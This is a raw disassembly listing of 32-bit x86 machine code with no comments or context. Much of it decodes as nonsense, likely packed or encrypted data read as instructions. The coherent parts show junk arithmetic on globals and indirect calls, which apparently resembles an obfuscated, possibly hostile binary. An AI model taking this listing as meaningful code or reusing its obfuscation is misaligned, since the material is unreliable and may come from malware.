  41e787:	and    dh,BYTE PTR [eax-0x80]
  41e78a:	jbe    0x41e735
  41e78c:	mov    ebp,0xa5ea8181
  41e791:	push   0x47
  41e793:	in     al,dx
  41e794:	ret    0x6365
  41e797:	cmc    
  41e798:	shl    BYTE PTR ds:0x10450970,1
  41e79e:	aaa    
  41e79f:	dec    esi
  41e7a0:	jno    0x41e7e1
  41e7a2:	ficom  WORD PTR [ecx-0x7335943a]
  41e7a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7a9:	push   cs
  41e7aa:	and    dh,BYTE PTR [ebx-0x68]
  41e7ad:	test   ebx,ebx
  41e7af:	dec    ebx
  41e7b0:	mov    eax,es:0x376f406d
  41e7b6:	adc    al,0xcb
  41e7b8:	mov    DWORD PTR [esi+0x36f7f22b],edx
  41e7be:	not    DWORD PTR [esi+0x5e]
  41e7c1:	leave  
  41e7c2:	xlat   BYTE PTR ds:[ebx]
  41e7c3:	cmp    DWORD PTR [eax+0x2a],edx
  41e7c6:	gs ja  0x41e7bf
  41e7c9:	xchg   ebp,eax
  41e7ca:	shl    BYTE PTR [esp+edi*1-0xcfcc19e],1
  41e7d1:	aaa    
  41e7d2:	(bad)  
  41e7d3:	jns    0x41e802
  41e7d5:	lods   eax,DWORD PTR ds:[esi]
  41e7d6:	cmp    BYTE PTR [ebp-0x4e],dl
  41e7d9:	jg     0x41e7ca
  41e7db:	jmp    0xac0c6487
  41e7e0:	xor    ch,ch
  41e7e2:	and    ebp,esi
  41e7e4:	xchg   ecx,eax
  41e7e5:	sti    
  41e7e6:	add    edi,0xfc113e83
  41e7ec:	(bad)  
  41e7ee:	xor    BYTE PTR [ecx+eax*4-0x2a],0x77
  41e7f3:	test   eax,0x7ac53a73
  41e7f8:	fist   DWORD PTR [ebx+0x1f]
  41e7fb:	imul   esp,DWORD PTR [edx],0x4a
  41e7fe:	nop
  41e7ff:	and    ch,BYTE PTR [ebp-0x29]
  41e802:	sbb    eax,0xbff0b229
  41e807:	fmul   QWORD PTR [edi-0x6c6be849]
  41e80d:	sahf   
  41e80e:	xor    DWORD PTR [ebx],ebp
  41e810:	scas   al,BYTE PTR es:[edi]
  41e811:	push   0x206ae47e
  41e816:	xor    eax,0x467ca3a6
  41e81b:	pop    edi
  41e81c:	pop    edi
  41e81d:	imul   edx,esi,0x66
  41e820:	inc    esp
  41e821:	add    BYTE PTR [eax-0x7691383b],bh
  41e827:	stos   BYTE PTR es:[edi],al
  41e828:	outs   dx,DWORD PTR ds:[esi]
  41e829:	daa    
  41e82a:	fiadd  DWORD PTR [ebx]
  41e82c:	jb     0x41e879
  41e82e:	std    
  41e82f:	test   al,0xfb
  41e831:	inc    ebx
  41e832:	fsubr  QWORD PTR gs:[esi]
  41e835:	mov    ah,0x56
  41e837:	mov    ah,0xfb
  41e839:	jle    0x41e82a
  41e83b:	js     0x41e89e
  41e83d:	and    BYTE PTR [ebx+0x62af1409],dh
  41e843:	ret    
  41e844:	xchg   ebp,eax
  41e845:	xchg   esi,eax
  41e846:	dec    ecx
  41e847:	jmp    0x41e843
  41e849:	iret   
  41e84a:	jo     0x41e81c
  41e84c:	sar    BYTE PTR [ebp+ebp*4+0x991fdd8],cl
  41e853:	stc    
  41e854:	dec    edi
  41e855:	lahf   
  41e856:	jmp    0x7eeda933
  41e85b:	leave  
  41e85c:	mov    BYTE PTR [eax-0x2b],bh
  41e85f:	je     0x41e817
  41e861:	add    DWORD PTR [esi+ebp*8+0x51],ebx
  41e865:	add    al,0xe6
  41e867:	xchg   esi,eax
  41e868:	fcomp  QWORD PTR [eax-0x29]
  41e86b:	call   0x87fce9e2
  41e870:	jle    0x41e8ac
  41e872:	fnstsw WORD PTR [esi+ecx*4]
  41e875:	test   BYTE PTR [edx+0x274baf3],ah
  41e87b:	jb     0x41e8f0
  41e87d:	pop    ss
  41e87e:	pop    es
  41e87f:	mov    ecx,ebx
  41e881:	fwait
  41e882:	clc    
  41e883:	das    
  41e884:	jecxz  0x41e89b
  41e886:	and    eax,0x7af2d174
  41e88b:	nop
  41e88c:	xor    ah,BYTE PTR [bx+di+0x7]
  41e890:	pop    ebp
  41e891:	pop    eax
  41e892:	cdq    
  41e893:	in     eax,0x34
  41e895:	mov    bl,0x85
  41e897:	push   ebp
  41e898:	mov    DWORD PTR [edi-0x6cc9527b],0x4deeee0f
  41e8a2:	sti    
  41e8a3:	adc    ebp,0xffffffcd
  41e8a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8a7:	addr16 inc ebp
  41e8a9:	push   ebp
  41e8aa:	push   0xffffff9b
  41e8ac:	call   0xde11cc8f
  41e8b1:	and    dh,0xdb
  41e8b4:	jg     0x41e909
  41e8b6:	mov    esi,0xfcf71d1c
  41e8bb:	rcr    ch,cl
  41e8bd:	mov    ecx,0x2b81c760
  41e8c2:	aaa    
  41e8c3:	and    al,dl
  41e8c5:	lods   al,BYTE PTR ds:[esi]
  41e8c6:	and    ch,BYTE PTR ds:0xa1274c15
  41e8cc:	jns    0x41e8bc
  41e8ce:	ins    DWORD PTR es:[edi],dx
  41e8cf:	sbb    DWORD PTR [ebp-0xe],ebx
  41e8d2:	mov    esp,0x7f776ba1
  41e8d7:	test   BYTE PTR [ebp+0x4296b608],0xcb
  41e8de:	lahf   
  41e8df:	fsubr  st(1),st
  41e8e1:	cmp    al,0xe
  41e8e3:	jmp    0x41e8f6
  41e8e5:	cmp    edi,DWORD PTR cs:[edi+eax*4+0x73]
  41e8ea:	outs   dx,BYTE PTR ds:[esi]
  41e8eb:	clc    
  41e8ec:	adc    BYTE PTR [ecx+0x764f6e4],dh
  41e8f2:	xchg   ebp,eax
  41e8f3:	pop    es
  41e8f4:	xchg   esp,eax
  41e8f5:	(bad)  
  41e8f6:	adc    ebp,ebx
  41e8f8:	dec    esp
  41e8f9:	sar    esp,0xb1
  41e8fc:	jo     0x41e8b4
  41e8fe:	cdq    
  41e8ff:	add    esp,ebp
  41e901:	push   ebp
  41e902:	cld    
  41e903:	adc    eax,0x60fb243c
  41e908:	jae    0x41e8b8
  41e90a:	jmp    0xc64e:0xb8e384b5
  41e911:	fisttp QWORD PTR [ecx]
  41e913:	mov    al,0xd6
  41e915:	mov    al,0x23
  41e917:	(bad)  
  41e918:	xor    BYTE PTR [esi],dh
  41e91a:	xchg   ebx,eax
  41e91b:	sbb    DWORD PTR [esi],0xcd49b3e9
  41e921:	adc    DWORD PTR ds:0x2d082246,0x64
  41e928:	pushf  
  41e929:	add    al,0x6
  41e92b:	pop    ebp
  41e92c:	outs   dx,DWORD PTR ds:[esi]
  41e92d:	push   esp
  41e92e:	push   0x1f73cdc0
  41e933:	jb     0x41e91c
  41e935:	xchg   edi,edx
  41e937:	cmp    al,0x55
  41e939:	adc    DWORD PTR [ebp-0x4f],esi
  41e93c:	cli    
  41e93d:	clc    
  41e93e:	mov    al,0x59
  41e940:	ret    
  41e941:	jle    0x41e941
  41e943:	div    BYTE PTR [ebx-0x330116f7]
  41e949:	repz or BYTE PTR [esi],al
  41e94c:	adc    al,0x5f
  41e94e:	xor    eax,0xb5f103ff
  41e953:	and    DWORD PTR ds:0xe8630f95,eax
  41e959:	adc    edx,esp
  41e95b:	loope  0x41e9b4
  41e95d:	test   dh,al
  41e95f:	pop    esi
  41e960:	stos   DWORD PTR es:[edi],eax
  41e961:	loope  0x41e8f8
  41e963:	fdiv   QWORD PTR [ebx]
  41e965:	imul   ebx,DWORD PTR [esi],0xcd4f4c4b
  41e96b:	cmp    ch,BYTE PTR [ebp+0x27]
  41e96e:	int3   
  41e96f:	and    BYTE PTR [ebx],dh
  41e971:	adc    al,0x1a
  41e973:	scas   al,BYTE PTR es:[edi]
  41e974:	xchg   ebp,eax
  41e975:	fist   WORD PTR [ecx+0x7989aae3]
  41e97b:	fcomp  DWORD PTR [edi+0x26]
  41e97e:	lods   ax,WORD PTR ds:[esi]
  41e980:	adc    BYTE PTR [ebp+0x6c],al
  41e983:	or     edx,edi
  41e985:	mov    ecx,edx
  41e987:	mov    edx,DWORD PTR [esp+0x18]
  41e98b:	xor    eax,ebx
  41e98d:	xor    ecx,esi
  41e98f:	mov    esi,DWORD PTR [esp+0x1c]
  41e993:	cmp    edx,eax
  41e995:	jne    0x41e9a3
  41e99b:	cmp    esi,ecx
  41e99d:	je     0x41e9ea
  41e9a3:	push   DWORD PTR ds:0x422628
  41e9a9:	push   DWORD PTR ds:0x4223bc
  41e9af:	mov    eax,ds:0x422538
  41e9b4:	mov    eax,DWORD PTR [eax+0x1a4]
  41e9ba:	push   DWORD PTR [eax]
  41e9bc:	mov    eax,DWORD PTR [esp+0x78]
  41e9c0:	call   eax
  41e9c2:	mov    ecx,DWORD PTR ds:0x422538
  41e9c8:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41e9ce:	mov    DWORD PTR [ecx],eax
  41e9d0:	mov    eax,ds:0x422538
  41e9d5:	push   0x4
  41e9d7:	add    eax,0x1dc
  41e9dc:	push   eax
  41e9dd:	lea    eax,[esp+0x84]
  41e9e4:	push   eax
  41e9e5:	call   0x415231
  41e9ea:	mov    eax,DWORD PTR [esp+0x7c]
  41e9ee:	mov    eax,DWORD PTR [eax]
  41e9f0:	pop    edi
  41e9f1:	pop    esi
  41e9f2:	pop    ebx
  41e9f3:	mov    esp,ebp
  41e9f5:	pop    ebp
  41e9f6:	ret    0xc
  41e9f9:	push   ebp
  41e9fa:	mov    ebp,esp
  41e9fc:	sub    esp,0x23c
  41ea02:	or     ecx,eax
  41ea04:	push   ebx
  41ea05:	cmp    DWORD PTR ds:0x428247,0x0
  41ea0c:	mov    DWORD PTR ds:0x428353,0x7749
  41ea16:	mov    DWORD PTR ds:0x428153,ebx
  41ea1c:	mov    DWORD PTR ds:0x4282f3,edx
  41ea22:	mov    DWORD PTR ds:0x4282f3,0xc7b
  41ea2c:	jmp    0x41ea8e
  41ea31:	mov    DWORD PTR ds:0x42826b,edx
  41ea37:	cmp    DWORD PTR ds:0x428247,0x0
  41ea3e:	jg     0x41ea74
  41ea44:	push   0x2154
  41ea49:	push   0x5063
  41ea4e:	call   DWORD PTR ds:0x428df4
  41ea54:	sbb    DWORD PTR ds:0x42834f,ecx
  41ea5a:	mov    ecx,DWORD PTR ds:0x4282fb
  41ea60:	xor    ecx,DWORD PTR ds:0x4282e7
  41ea66:	mov    DWORD PTR ds:0x4282fb,ecx
  41ea6c:	sbb    ecx,0x6e15
  41ea72:	neg    ecx
  41ea74:	xor    DWORD PTR ds:0x428223,ecx
  41ea7a:	adc    ecx,DWORD PTR ds:0x428177
  41ea80:	mov    ecx,DWORD PTR ds:0x4281c3
  41ea86:	mov    ecx,DWORD PTR [ecx]
  41ea88:	and    DWORD PTR ds:0x428167,ecx
  41ea8e:	push   esi
  41ea8f:	mov    ecx,DWORD PTR ds:0x4281d7
  41ea95:	mov    eax,ds:0x4282c3
  41ea9a:	sub    eax,ecx
  41ea9c:	imul   ecx,DWORD PTR [ecx+eax*1]
  41eaa0:	push   edi
  41eaa1:	add    DWORD PTR ds:0x42823b,ebx
  41eaa7:	mov    DWORD PTR [ebp-0x50],0x1
  41eaae:	sub    DWORD PTR ds:0x42826b,edi
  41eab4:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41eabe:	xor    DWORD PTR ds:0x4282fb,0x437e
  41eac8:	mov    DWORD PTR [ebp-0xb8],0x1
  41ead2:	mov    ecx,DWORD PTR [ebp-0xb8]
  41ead8:	add    eax,0x2e28
  41eadd:	mov    eax,0x584
  41eae2:	xor    edx,edx
  41eae4:	sbb    DWORD PTR ds:0x428377,0x4282cf
  41eaee:	div    ecx
  41eaf0:	xor    ecx,0x2352
  41eaf6:	imul   eax,eax,0x51d4
  41eafc:	neg    ecx
  41eafe:	mov    ecx,DWORD PTR [ebp-0xbc]
  41eb04:	or     DWORD PTR ds:0x428363,0x428373
  41eb0e:	xor    eax,ecx
  41eb10:	and    eax,0x4c09
  41eb15:	xor    ecx,DWORD PTR ds:0x4282e3
  41eb1b:	mov    ecx,DWORD PTR [ebp-0x50]
  41eb1e:	xor    edx,edx
  41eb20:	and    DWORD PTR ds:0x42823b,0x42816f
  41eb2a:	div    ecx
  41eb2c:	or     DWORD PTR ds:0x428387,0x3423
  41eb36:	sub    eax,0x401
  41eb3b:	cmp    DWORD PTR ds:0x428307,0x0
  41eb42:	mov    DWORD PTR ds:0x428377,edx
  41eb48:	mov    DWORD PTR ds:0x428217,ebx
  41eb4e:	not    DWORD PTR ds:0x428213
  41eb54:	jmp    0x41ebb2
  41eb59:	mov    DWORD PTR ds:0x42820b,0x3ca0
  41eb63:	not    DWORD PTR ds:0x4282f7
  41eb69:	cmp    DWORD PTR ds:0x428307,0x0
  41eb70:	je     0x41eba0
  41eb76:	push   DWORD PTR [ebp-0x10]
  41eb79:	push   0x4da1
  41eb7e:	push   0x1144
  41eb83:	push   DWORD PTR [ebp-0x18]
  41eb86:	call   DWORD PTR ds:0x428df8
  41eb8c:	add    edx,0x1800
  41eb92:	add    edx,DWORD PTR ds:0x42836f
  41eb98:	sub    ecx,ecx
  41eb9a:	adc    ecx,0x47f1
  41eba0:	sub    edx,edx
  41eba2:	mov    DWORD PTR ds:0x428377,0x44a4
  41ebac:	and    ecx,DWORD PTR ds:0x42820f
  41ebb2:	mov    DWORD PTR [ebp-0x90],eax
  41ebb8:	mov    eax,ds:0x4282a3
  41ebbd:	mov    eax,DWORD PTR [eax]
  41ebbf:	sbb    DWORD PTR ds:0x428373,eax
  41ebc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41ebcf:	add    DWORD PTR ds:0x42813b,0x428287
  41ebd9:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41ebe0:	xor    DWORD PTR ds:0x42822f,edx
  41ebe6:	mov    DWORD PTR [ebp-0xb4],0x3842
  41ebf0:	or     edx,ecx
  41ebf2:	jmp    0x41ef4e
  41ebf7:	ret    0x8bf6
  41ebfa:	push   ebx
  41ebfb:	sbb    ch,BYTE PTR [ebx]
  41ebfd:	mov    edx,0x71125f66
  41ec02:	mov    al,0x5c
  41ec04:	cmp    edi,DWORD PTR cs:[esi+0x18162f0e]
  41ec0b:	mov    ds:0x70181812,eax
  41ec10:	xchg   DWORD PTR [esi-0x406e350a],esp
  41ec16:	ret    0x63f0
  41ec19:	xchg   edi,eax
  41ec1a:	cld    
  41ec1b:	xchg   ebp,eax
  41ec1c:	test   al,0xc5
  41ec1e:	gs lahf 
  41ec20:	cmp    BYTE PTR [ebx+0x6f],al
  41ec23:	push   edx
  41ec24:	xor    eax,0x5c1b104f
  41ec29:	mov    ch,0xbe
  41ec2b:	and    bh,BYTE PTR [edx-0x42]
  41ec2e:	ret    0xf04b
  41ec31:	pop    es
  41ec32:	inc    esp
  41ec33:	int    0xd1
  41ec35:	push   cs
  41ec36:	les    ecx,FWORD PTR [edi-0x58]
  41ec39:	lods   eax,DWORD PTR fs:[esi]
  41ec3b:	push   ss
  41ec3c:	sbb    eax,0xdeaa726b
  41ec41:	test   al,0x22
  41ec43:	push   cs
  41ec44:	and    eax,0x67d512e7
  41ec49:	stos   BYTE PTR es:[edi],al
  41ec4a:	loop   0x41ec47
  41ec4c:	mov    ch,BYTE PTR [edx+0x3a]
  41ec4f:	inc    ebx
  41ec50:	fist   WORD PTR [esi+0x2b0439ca]
  41ec56:	push   esi
  41ec57:	lods   eax,DWORD PTR ds:[esi]
  41ec58:	inc    BYTE PTR [esi-0x10]
  41ec5b:	push   ebx
  41ec5c:	ds mov cl,0x3f
  41ec5f:	in     eax,0xe9
  41ec61:	or     dh,0x4e
  41ec64:	call   0x6705:0xa618033e
  41ec6b:	xchg   ecx,eax
  41ec6c:	cmp    DWORD PTR [ecx+0x2edbaee0],ebp
  41ec72:	popa   
  41ec73:	lock enter 0x9bf8,0x82
  41ec78:	(bad)  
  41ec79:	fist   WORD PTR [ebx]
  41ec7b:	inc    ebp
  41ec7c:	mov    eax,DWORD PTR [esp+esi*2+0x5484b9a5]
  41ec83:	sbb    eax,0x3514cdcb
  41ec88:	add    DWORD PTR es:[edx],edi
  41ec8b:	adc    edi,DWORD PTR [esi-0x35]
  41ec8e:	xchg   edx,eax
  41ec8f:	sbb    edi,DWORD PTR [ebx]
  41ec91:	cmp    dl,BYTE PTR [edx-0x13c7517d]
  41ec97:	jb     0x41ec6a
  41ec99:	and    ecx,DWORD PTR [ebx]
  41ec9b:	ret    0x5865
  41ec9e:	add    edx,esi
  41eca0:	(bad)
  41eca4:	(bad)  
  41eca5:	dec    edi
  41eca6:	cmp    ecx,esp
  41eca8:	iret   
  41eca9:	add    DWORD PTR [ecx],0x203dcaf0
  41ecaf:	repz std 
  41ecb1:	loope  0x41ec4d
  41ecb3:	cdq    
  41ecb4:	push   ebx
  41ecb5:	add    al,0x58
  41ecb7:	dec    edx
  41ecb8:	jns    0x41ecde
  41ecba:	fistp  DWORD PTR [ecx+eiz*4+0x551b4a7f]
  41ecc1:	push   ss
  41ecc2:	call   0x1f28186c
  41ecc7:	mov    ds:0xdeb04aa9,eax
  41eccc:	pop    edi
  41eccd:	fs dec ecx
  41eccf:	ror    DWORD PTR [ebx+0x26eebce6],cl
  41ecd5:	stos   BYTE PTR es:[edi],al
  41ecd6:	ins    BYTE PTR es:[edi],dx
  41ecd7:	bound  ecx,QWORD PTR [ecx]
  41ecd9:	fwait
  41ecda:	add    bh,BYTE PTR [ebx]
  41ecdc:	ror    DWORD PTR [eax+0x31],0x17
  41ece0:	lods   eax,DWORD PTR ds:[esi]
  41ece1:	sar    DWORD PTR cs:[ebp+0x7494957b],1
  41ece8:	cdq    
  41ece9:	adc    BYTE PTR [ebx],0x92
  41ecec:	inc    ecx
  41eced:	pop    ss
  41ecee:	sbb    DWORD PTR [ecx],esi
  41ecf0:	and    ecx,DWORD PTR [esi]
  41ecf2:	loope  0x41ecda
  41ecf4:	jg     0x41ed19
  41ecf6:	push   ebx
  41ecf7:	(bad)  
  41ecf9:	int    0x6b
  41ecfb:	pop    ebp
  41ecfc:	fcmovu st,st(3)
  41ecfe:	int    0x4d
  41ed00:	mov    esi,0x115620e7
  41ed05:	in     al,dx
  41ed06:	push   edi
  41ed07:	call   0x75a0:0x5e5082bc
  41ed0e:	ret    
  41ed0f:	daa    
  41ed10:	test   eax,0xe14422b3
  41ed15:	and    eax,0x5b70cc0c
  41ed1a:	mov    ch,0x98
  41ed1c:	xchg   esp,eax
  41ed1d:	push   ss
  41ed1e:	pop    edi
  41ed1f:	cmp    eax,0x4600573b
  41ed24:	std    
  41ed25:	ins    DWORD PTR es:[edi],dx
  41ed26:	mov    edi,0x14d0753e
  41ed2b:	sub    dl,BYTE PTR [edi+0x180aa91a]
  41ed31:	clc    
  41ed32:	imul   eax,DWORD PTR [edi-0x4de091e0],0xffffff86
  41ed39:	mov    WORD PTR [edi+0x6d],?
  41ed3c:	cli    
  41ed3d:	push   ecx
  41ed3e:	sbb    ecx,DWORD PTR [ebx-0x41]
  41ed41:	mov    BYTE PTR [edi-0x30bdc892],al
  41ed47:	jle    0x41ed62
  41ed49:	repz cmp bl,BYTE PTR [esi-0xfe8de12]
  41ed50:	addr16 pushf 
  41ed52:	lods   eax,DWORD PTR ds:[esi]
  41ed53:	mov    bl,0x58
  41ed55:	pop    es
  41ed56:	or     eax,0x9764eecf
  41ed5b:	pop    ebx
  41ed5c:	inc    ecx
  41ed5d:	fcomp  QWORD PTR [ebx+0x24ff2e07]
  41ed63:	fwait
  41ed64:	or     dh,bh
  41ed66:	dec    ecx
  41ed67:	fcom   DWORD PTR [ebx-0x7a]
  41ed6a:	dec    edi
  41ed6b:	call   0xadf3:0xceacc5dd
  41ed72:	xchg   esp,eax
  41ed73:	inc    edi
  41ed74:	mov    dh,0xf8
  41ed76:	cdq    
  41ed77:	pop    es
  41ed78:	popa   
  41ed79:	nop
  41ed7a:	jnp    0x41edf4
  41ed7c:	jbe    0x41ede2
  41ed7e:	add    eax,0x2d4b216f
  41ed83:	and    eax,0xb68e1478
  41ed88:	fist   DWORD PTR [esi-0x2fdea536]
  41ed8e:	sbb    eax,0xbf895405
  41ed93:	xchg   edi,eax
  41ed94:	inc    BYTE PTR [eax]
  41ed96:	jne    0x41ed23
  41ed98:	mov    bl,0x73
  41ed9a:	pusha  
  41ed9b:	mov    BYTE PTR [edx+0x511398f8],al
  41eda1:	dec    ecx
  41eda2:	ins    BYTE PTR es:[edi],dx
  41eda3:	xor    ecx,ebx
  41eda5:	pop    esp
  41eda6:	loope  0x41ed7b
  41eda8:	into   
  41eda9:	push   ds
  41edaa:	js     0x41edae
  41edac:	push   0x6f
  41edae:	jbe    0x41ed91
  41edb0:	loope  0x41ed4b
  41edb2:	mov    ch,0xff
  41edb4:	(bad)  
  41edb5:	sub    al,0xc2
  41edb7:	mov    ebp,0x6ff1689
  41edbc:	sbb    ebp,0x3e91c10d
  41edc2:	mov    edi,0x1ac23ba6
  41edc7:	lea    eax,[ebp-0x27]
  41edca:	inc    edi
  41edcb:	jbe    0x41edd8
  41edcd:	rol    DWORD PTR [ebp-0x203930ae],cl
  41edd3:	cmp    eax,DWORD PTR [edx]
  41edd5:	cmp    DWORD PTR [ebx+0x7a],esi
  41edd8:	(bad)  
  41edd9:	jmp    0x41ee0b
  41eddb:	pop    esi
  41eddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eddd:	cmp    DWORD PTR [esi],ebp
  41eddf:	and    dh,BYTE PTR fs:[esi]
  41ede2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ede3:	push   ebx
  41ede4:	dec    esp
  41ede5:	push   ecx
  41ede6:	xor    ebx,edi
  41ede8:	jae    0x41edd3
  41edea:	mov    ds:0x5c04a74a,al
  41edef:	test   eax,0xf80102f5
  41edf4:	cmc    
  41edf5:	mov    esi,0xd30603aa
  41edfa:	scas   eax,DWORD PTR es:[edi]
  41edfb:	mov    ebx,0x3a89088d
  41ee00:	fisub  WORD PTR [ebx+0x43c32ae3]
  41ee06:	adc    BYTE PTR [edx+0x6bac9b86],al
  41ee0c:	cmp    dh,al
  41ee0e:	repnz mov ds:0xc8e0acd6,eax
  41ee14:	popf   
  41ee15:	and    ch,ah
  41ee17:	rcl    DWORD PTR [ebx],1
  41ee19:	stos   DWORD PTR es:[di],eax
  41ee1b:	and    eax,ebp
  41ee1d:	jl     0x41edf3
  41ee1f:	test   eax,0x69b2a18d
  41ee24:	dec    ecx
  41ee25:	pusha  
  41ee26:	fist   WORD PTR [ecx+ecx*2+0x1ae66c15]
  41ee2d:	add    al,0x25
  41ee2f:	jecxz  0x41ee2c
  41ee31:	sbb    DWORD PTR [eax+0x258bbeed],ecx
  41ee37:	fimul  DWORD PTR [esp+ebp*4-0x40]
  41ee3b:	push   edx
  41ee3c:	rcl    DWORD PTR ds:0xa2cebfcf,0xd
  41ee43:	(bad)  
  41ee44:	jno    0x41edf2
  41ee46:	ret    0x799f
  41ee49:	retf   0x1d43
  41ee4c:	and    ah,BYTE PTR fs:[ecx-0x7a15ee41]
  41ee53:	mov    WORD PTR [edi-0x18fbdf08],?
  41ee59:	xchg   ebp,eax
  41ee5a:	outs   dx,BYTE PTR ds:[esi]
  41ee5b:	cmp    cl,bl
  41ee5d:	add    edi,DWORD PTR [esi+esi*4+0x3c9d28e5]
  41ee64:	adc    al,0x18
  41ee66:	lods   al,BYTE PTR ds:[esi]
  41ee67:	pop    ebx
  41ee68:	dec    esp
  41ee69:	(bad)  
  41ee6a:	sbb    al,BYTE PTR [ebp+0x231957f5]
  41ee70:	(bad)  
  41ee71:	mov    WORD PTR [ecx+0x59],ds
  41ee74:	cmp    dh,dh
  41ee76:	adc    eax,0xb49fba9f
  41ee7b:	fcomp  DWORD PTR [esi+0x33]
  41ee7e:	mov    bh,BYTE PTR ds:0x211e1411
  41ee84:	nop
  41ee85:	stos   BYTE PTR es:[edi],al
  41ee86:	fsubr  DWORD PTR ds:0x88e64764
  41ee8c:	xchg   esp,eax
  41ee8d:	and    BYTE PTR ds:0x147592f8,0xe3
  41ee94:	pusha  
  41ee95:	daa    
  41ee96:	cmp    DWORD PTR [ebx+0x4bb168a6],0x7f
  41ee9d:	scas   eax,DWORD PTR es:[edi]
  41ee9e:	xchg   esi,eax
  41ee9f:	push   edi
  41eea0:	push   es
  41eea1:	mov    dl,0x4d
  41eea3:	inc    ecx
  41eea4:	push   ds
  41eea5:	push   es
  41eea6:	mul    eax
  41eea8:	cmc    
  41eea9:	lock sub al,0x38
  41eeac:	(bad)  
  41eead:	mov    bh,0xa8
  41eeaf:	nop
  41eeb0:	retf   0x41a9
  41eeb3:	jb     0x41eeac
  41eeb5:	add    bh,BYTE PTR [ebx+0x2f]
  41eeb8:	ins    BYTE PTR es:[edi],dx
  41eeb9:	out    dx,eax
  41eeba:	xchg   esp,eax
  41eebb:	dec    edi
  41eebc:	test   al,0x4c
  41eebe:	cmp    al,0x8
  41eec0:	and    edi,edx
  41eec2:	lods   al,BYTE PTR ds:[esi]
  41eec3:	dec    ebx
  41eec4:	mul    DWORD PTR [ebp+0x7627e550]
  41eeca:	sub    esi,DWORD PTR [eax+0x220e4b90]
  41eed0:	fxtract 
  41eed2:	loope  0x41eee5
  41eed4:	(bad)  
  41eed5:	pop    ebx
  41eed6:	fistp  DWORD PTR cs:[esi+esi*4]
  41eeda:	in     eax,dx
  41eedb:	xchg   ebx,eax
  41eedc:	add    BYTE PTR [ebp-0x20df21a3],bh
  41eee2:	sbb    al,0xcd
  41eee4:	pushf  
  41eee5:	sar    DWORD PTR [edi-0x3d56756d],1
  41eeeb:	pop    ss
  41eeec:	xchg   edi,eax
  41eeed:	test   eax,0xcdfa42cc
  41eef2:	retf   
  41eef3:	cmc    
  41eef4:	into   
  41eef5:	jns    0x41ef0e
  41eef7:	and    BYTE PTR [eax+0x36],ch
  41eefa:	shl    BYTE PTR [esi-0x33],1
  41eefd:	add    ecx,0xbdd9021e
  41ef03:	xchg   dl,dl
  41ef05:	loop   0x41eeb5
  41ef07:	inc    ebp
  41ef08:	mov    eax,0x80b2cc40
  41ef0d:	mov    esi,DWORD PTR [ebp+eax*4-0x4104f753]
  41ef14:	aas    
  41ef15:	pop    es
  41ef16:	call   0x531d2709
  41ef1b:	ret    0xbf8e
  41ef1e:	fidivr WORD PTR [ecx+ecx*2-0x46]
  41ef22:	shr    DWORD PTR [edx-0x20a8b07f],0x79
  41ef29:	fmul   QWORD PTR [edx]
  41ef2b:	ins    BYTE PTR es:[edi],dx
  41ef2c:	leave  
  41ef2d:	aad    0xc0
  41ef2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef30:	test   al,0xe7
  41ef32:	xchg   DWORD PTR [ebx+0x30],esp
  41ef35:	fnsave [edx-0x14]
  41ef38:	shl    DWORD PTR [ebx+0x29],0xbb
  41ef3c:	jg     0x41ef64
  41ef3e:	popa   
  41ef3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef40:	add    DWORD PTR fs:[edx+ebp*4],ebx
  41ef44:	xchg   esp,eax
  41ef45:	fst    DWORD PTR [ecx]
  41ef47:	aam    0x46
  41ef49:	pop    ds
  41ef4a:	xchg   esp,eax
  41ef4b:	dec    edi
  41ef4c:	jg     0x41ef99
  41ef4e:	mov    eax,DWORD PTR [ebp-0x4c]
  41ef51:	adc    DWORD PTR ds:0x42814f,0x3493
  41ef5b:	add    eax,DWORD PTR [ebp-0xb4]
  41ef61:	xor    edx,0x29c
  41ef67:	xor    eax,0x2e02
  41ef6c:	sbb    ecx,ecx
  41ef6e:	xor    eax,0x7294
  41ef73:	movzx  edx,WORD PTR ds:0x428273
  41ef7a:	sbb    DWORD PTR ds:0x42814f,edx
  41ef80:	imul   eax,eax,0x68f3
  41ef86:	and    DWORD PTR ds:0x428167,edi
  41ef8c:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ef92:	cmp    DWORD PTR ds:0x4282db,0x0
  41ef99:	mov    edx,0x254
  41ef9e:	mov    edx,0x254c
  41efa3:	mov    edx,0x6b4f
  41efa8:	jmp    0x41f000
  41efad:	mov    DWORD PTR ds:0x4282cb,0x78fa
  41efb7:	cmp    DWORD PTR ds:0x4282db,0x0
  41efbe:	jb     0x41efe4
  41efc4:	push   DWORD PTR [ebp-0x1c]
  41efc7:	push   0x74cd
  41efcc:	push   0x4a2f
  41efd1:	call   DWORD PTR ds:0x428dfc
  41efd7:	sub    edx,DWORD PTR ds:0x42820f
  41efdd:	inc    edx
  41efde:	and    edx,DWORD PTR ds:0x42822b
  41efe4:	mov    DWORD PTR ds:0x428373,0x703b
  41efee:	and    edx,DWORD PTR ds:0x42821b
  41eff4:	xor    edx,DWORD PTR ds:0x428287
  41effa:	and    DWORD PTR ds:0x428387,edx
  41f000:	and    eax,ecx
  41f002:	sub    eax,0x2818
  41f007:	mov    DWORD PTR [ebp-0xe8],eax
  41f00d:	jmp    0x41f369
  41f012:	adc    al,0x29
  41f015:	fstp   DWORD PTR [ebx]
  41f017:	and    BYTE PTR [edx+0x3a],ah
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	repz mov ebx,0x8babe8b0
  41f021:	jo     0x41efbc
  41f023:	sub    DWORD PTR [esi],edx
  41f025:	sbb    BYTE PTR [ebx+0x7e181812],ah
  41f02b:	cdq    
  41f02c:	in     eax,0x2e
  41f02e:	cmp    ch,ah
  41f030:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41f032:	dec    edx
  41f033:	je     0x41f02a
  41f035:	rol    cl,cl
  41f037:	test   ebx,edi
  41f039:	outs   dx,BYTE PTR ds:[esi]
  41f03a:	outs   dx,DWORD PTR ds:[esi]
